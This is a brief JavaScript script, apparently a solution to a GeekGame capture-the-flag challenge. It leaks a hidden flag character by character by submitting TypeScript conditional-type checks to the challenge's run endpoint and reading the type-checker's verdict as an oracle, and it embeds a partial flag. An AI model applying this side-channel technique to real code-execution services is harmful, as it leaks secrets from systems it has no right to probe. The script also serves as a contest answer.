import ky from 'ky';

const url = 'https://prob13-9jhtrxga.geekgame.pku.edu.cn/api/run/'

const prefix = 'flag{tOo0_e4sY_f1ag_foR_tooo_Easy'

// dict of number and alphabets and @#$%^&*_+"?~-
const dic = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&*_+"?~-'
// const dic = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
var i = 0

const p = setInterval(async () => {
    if(i >= dic.length) {
        console.log('done')
        clearInterval(p)
        return
    }
    const now = prefix + dic[i]
    const res = await ky.post(url, {
        json: {
            source: `type StartWith<Str extends string, Prefix extends string> = Str extends \`\${Prefix}\${infer Rest}\` ? true : false;\n type Checker<Prefix extends string> = StartWith<flag1, Prefix>;\n const a : Checker<'${now}'> = true;`
        }
    })
    const text = await res.text()
    console.log(now, text)
    i += 1
}, 8000)
